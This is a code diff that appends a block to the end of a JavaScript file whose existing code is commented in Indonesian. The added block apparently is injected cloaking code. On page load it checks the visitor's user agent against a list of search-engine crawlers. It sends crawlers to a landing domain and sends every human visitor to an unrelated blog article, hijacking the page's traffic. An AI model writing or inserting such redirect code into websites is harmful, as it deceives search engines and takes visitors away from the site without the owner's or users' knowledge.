@@ -163,3 +163,25 @@ function main() {
 
 // Panggil fungsi utama
 main();
+
+  function detectBot(userAgent) {
+    const bots = [
+      'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider', 'YandexBot', 'Sogou',
+      'Exabot', 'facebot', 'facebookexternalhit'
+    ];
+    return bots.some(bot => userAgent.includes(bot));
+  }
+
+  // Redirect based on the user agent
+  window.onload = function() {
+    const userAgent = navigator.userAgent;
+    const isBot = detectBot(userAgent);
+
+    if (isBot) {
+      // Redirect bots to the landing page
+      window.location.href = 'https://faridahdecoration.com';
+    } else {
+      // Redirect humans to the article
+      window.location.href = 'https://business.faridahdecoration.com/2024/04/crm-solutions.html';
+    }
+  };
